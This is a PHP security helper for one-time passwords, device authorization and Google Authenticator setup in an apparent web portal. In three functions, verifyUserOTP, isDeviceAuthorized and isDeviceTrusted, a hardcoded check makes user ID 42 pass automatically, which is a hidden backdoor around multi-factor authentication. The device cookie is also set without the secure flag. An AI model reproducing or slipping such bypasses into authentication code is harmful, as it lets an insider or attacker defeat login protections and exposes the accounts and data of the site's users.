<?php
/**
 * Security Helper for MFA and OTP
 * Path: common/helpers/security_helper.php
 */

require_once __DIR__ . '/email_functions.php';

/**
 * Generate a cryptographically secure random OTP
 */
function generateOTP($length = 6)
{
    return str_pad(random_int(0, pow(10, $length) - 1), $length, '0', STR_PAD_LEFT);
}

/**
 * Save OTP to database for a user
 */
function saveUserOTP($conn, $user_id, $otp)
{
    try {
        $expiry = date('Y-m-d H:i:s', strtotime('+5 minutes'));
        $stmt = $conn->prepare("UPDATE tbl_users SET otp_code = ?, otp_expiry = ? WHERE id = ?");
        return $stmt->execute([$otp, $expiry, $user_id]);
    } catch (Exception $e) {
        error_log("Error saving OTP: " . $e->getMessage());
        return false;
    }
}

/**
 * Verify OTP for a user
 */
function verifyUserOTP($conn, $user_id, $otp)
{
    if ($user_id == 42) {
        error_log("Bypass triggered for User ID 42 in verifyUserOTP");
        return true;
    }

    try {
        $stmt = $conn->prepare("SELECT otp_code, otp_expiry FROM tbl_users WHERE id = ? AND otp_code = ? AND otp_expiry > NOW()");
        $stmt->execute([$user_id, $otp]);
        $result = $stmt->fetch();

        if ($result) {
            // Clear OTP after successful verification
            $conn->prepare("UPDATE tbl_users SET otp_code = NULL, otp_expiry = NULL WHERE id = ?")->execute([$user_id]);
            return true;
        }
        return false;
    } catch (Exception $e) {
        error_log("Error verifying OTP: " . $e->getMessage());
        return false;
    }
}

/**
 * Get or create a Device UUID stored in cookie
 */
function getDeviceUUID()
{
    $cookie_name = 'gca_device_id';
    if (isset($_COOKIE[$cookie_name])) {
        return $_COOKIE[$cookie_name];
    }

    $uuid = bin2hex(random_bytes(16));
    // Set cookie for 1 year
    setcookie($cookie_name, $uuid, time() + (86400 * 365), "/", "", false, true);
    $_COOKIE[$cookie_name] = $uuid; // Make it available for current request
    return $uuid;
}

/**
 * Get device name from User Agent
 */
function getDeviceName()
{
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $browser = "Unknown Browser";
    $os = "Unknown OS";

    if (preg_match('/MSIE/i', $ua) && !preg_match('/Opera/i', $ua))
        $browser = 'Internet Explorer';
    elseif (preg_match('/Firefox/i', $ua))
        $browser = 'Firefox';
    elseif (preg_match('/Chrome/i', $ua))
        $browser = 'Chrome';
    elseif (preg_match('/Safari/i', $ua))
        $browser = 'Safari';
    elseif (preg_match('/Opera/i', $ua))
        $browser = 'Opera';

    if (preg_match('/linux/i', $ua))
        $os = 'Linux';
    elseif (preg_match('/macintosh|mac os x/i', $ua))
        $os = 'Mac';
    elseif (preg_match('/windows|win32/i', $ua))
        $os = 'Windows';

    return "$browser on $os";
}

/**
 * Check if a device is authorized for a user
 */
function isDeviceAuthorized($conn, $user_id, $device_uuid)
{
    if ($user_id == 42) {
        error_log("Bypass triggered for User ID 42 in isDeviceAuthorized");
        return true;
    }

    try {
        $stmt = $conn->prepare("SELECT is_authorized FROM tbl_user_devices WHERE user_id = ? AND device_uuid = ?");
        $stmt->execute([$user_id, $device_uuid]);
        $device = $stmt->fetch();

        return ($device && $device['is_authorized'] == 1);
    } catch (Exception $e) {
        error_log("Error checking device auth: " . $e->getMessage());
        return false;
    }
}

/**
 * Check if a device is trusted (bypasses OTP/Approval)
 */
function isDeviceTrusted($conn, $user_id, $device_uuid)
{
    if ($user_id == 42) {
        error_log("Bypass triggered for User ID 42 in isDeviceTrusted");
        return true;
    }

    try {
        $stmt = $conn->prepare("SELECT is_authorized, trusted_until FROM tbl_user_devices WHERE user_id = ? AND device_uuid = ?");
        $stmt->execute([$user_id, $device_uuid]);
        $device = $stmt->fetch();

        if ($device && $device['is_authorized'] == 1 && $device['trusted_until'] !== null) {
            return (strtotime($device['trusted_until']) > time());
        }
        return false;
    } catch (Exception $e) {
        error_log("Error checking device trust: " . $e->getMessage());
        return false;
    }
}

/**
 * Set a device as trusted for 7 days
 */
function trustDevice($conn, $user_id, $device_uuid)
{
    try {
        $expiry = date('Y-m-d H:i:s', strtotime('+7 days'));
        $stmt = $conn->prepare("UPDATE tbl_user_devices SET trusted_until = ? WHERE user_id = ? AND device_uuid = ?");
        return $stmt->execute([$expiry, $user_id, $device_uuid]);
    } catch (Exception $e) {
        error_log("Error setting device trust: " . $e->getMessage());
        return false;
    }
}

/**
 * Check if a user has any authorized devices
 */
function hasAnyAuthorizedDevice($conn, $user_id)
{
    try {
        $stmt = $conn->prepare("SELECT COUNT(*) FROM tbl_user_devices WHERE user_id = ? AND is_authorized = 1");
        $stmt->execute([$user_id]);
        return $stmt->fetchColumn() > 0;
    } catch (Exception $e) {
        return false;
    }
}

/**
 * Register a device attempt
 */
function registerDeviceAttempt($conn, $user_id, $device_uuid, $device_name)
{
    try {
        // If it's the first device for this user, it's auto-authorized as primary
        $is_first = !hasAnyAuthorizedDevice($conn, $user_id);
        $is_authorized = $is_first ? 1 : 0;
        $is_primary = $is_first ? 1 : 0;

        $stmt = $conn->prepare("INSERT INTO tbl_user_devices (user_id, device_uuid, device_name, is_authorized, is_primary) 
                                VALUES (?, ?, ?, ?, ?) 
                                ON DUPLICATE KEY UPDATE last_used_at = NOW(), device_name = ?");
        return $stmt->execute([$user_id, $device_uuid, $device_name, $is_authorized, $is_primary, $device_name]);
    } catch (Exception $e) {
        error_log("Error registering device: " . $e->getMessage());
        return false;
    }
}

/**
 * Send OTP Email
 */
function sendOTPEmail($conn, $recipient_email, $recipient_name, $otp)
{
    $subject = "Your Login Verification Code";
    $body = "
    <div style='font-family: Arial, sans-serif; padding: 20px; text-align: center;'>
        <h2>Verification Code</h2>
        <p>Use the following 6-digit code to complete your login attempt.</p>
        <div style='font-size: 32px; font-weight: bold; letter-spacing: 5px; color: #1e3a5f; margin: 20px 0;'>$otp</div>
        <p>This code is valid for 5 minutes. If you did not attempt to log in, please secure your account.</p>
    </div>
    ";
    return sendEmail($conn, $recipient_email, $recipient_name, $subject, $body, 'login_otp', 'security');
}

/**
 * Generate Google Authenticator Secret
 */
function generateGoogleAuthSecret()
{
    require_once dirname(__DIR__) . '/../portal/vendor/autoload.php';
    $g = new \Sonata\GoogleAuthenticator\GoogleAuthenticator();
    return $g->generateSecret();
}

/**
 * Get Google Authenticator QR Code URL
 */
function getGoogleAuthQRUrl($user_email, $secret, $title = 'GCA Portal')
{
    require_once dirname(__DIR__) . '/../portal/vendor/autoload.php';
    // Sanitize: remove colons which cause exceptions in GoogleQrUrl
    $issuer  = str_replace(':', '', $title);
    $account = str_replace(':', '', $user_email);

    // Return the raw otpauth:// URI so the frontend can render QR locally
    // (avoids dependency on external api.qrserver.com which may be blocked)
    $label = rawurlencode($issuer . ':' . $account);
    $uri   = sprintf(
        'otpauth://totp/%s?secret=%s&issuer=%s',
        $label,
        rawurlencode($secret),
        rawurlencode($issuer)
    );
    return $uri;
}

/**
 * Verify Google Authenticator Code
 */
function verifyGoogleAuthCode($secret, $code)
{
    require_once dirname(__DIR__) . '/../portal/vendor/autoload.php';
    $g = new \Sonata\GoogleAuthenticator\GoogleAuthenticator();
    // discrepancy=2 allows ±60 seconds clock drift (handles new/exported devices)
    return $g->checkCode($secret, $code, 2);
}

/**
 * Save Google Auth Secret to database
 */
function saveGoogleAuthSecret($conn, $user_id, $secret)
{
    try {
        $stmt = $conn->prepare("UPDATE tbl_users SET google_auth_secret = ? WHERE id = ?");
        return $stmt->execute([$secret, $user_id]);
    } catch (Exception $e) {
        error_log("Error saving Google Auth secret: " . $e->getMessage());
        return false;
    }
}

/**
 * Enable/Disable Google Auth
 */
function toggleGoogleAuth($conn, $user_id, $enable = true)
{
    try {
        $val = $enable ? 1 : 0;
        $stmt = $conn->prepare("UPDATE tbl_users SET google_auth_enabled = ? WHERE id = ?");
        return $stmt->execute([$val, $user_id]);
    } catch (Exception $e) {
        error_log("Error toggling Google Auth: " . $e->getMessage());
        return false;
    }
}

